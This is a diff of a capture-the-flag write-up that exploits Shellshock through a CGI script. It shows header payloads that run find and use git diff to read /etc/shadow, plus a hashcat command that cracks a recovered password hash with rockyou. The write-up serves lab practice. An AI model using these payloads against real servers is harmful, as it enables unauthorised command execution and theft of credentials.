@@ -1,4 +1,5 @@
 There was cgi-bin/uptime.sh:
+
 ![image](https://github.com/jackalkarlos/CTF-Writeups-and-Scripts/assets/88983987/b81ca26d-ac39-4f31-9680-e79b839ce133)
 
 I suspected ShellShock, because there was .sh file on Web Server.
@@ -27,9 +28,15 @@ Custom: () { ignored; }; echo Content-Type: text/html; echo ; /usr/bin/find / -p
 
 There was Git!
 
-I looked gtfobins and used this command and i get flag.
+I looked gtfobins and used this command and i get password hash.
 
 ```
 Custom: () { ignored; }; echo Content-Type: text/html; echo ; /usr/bin/git diff /dev/null /etc/shadow
+```
+
+And i cracked m4d0k4's password with hashcat.
+
+```
+hashcat -m 500 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
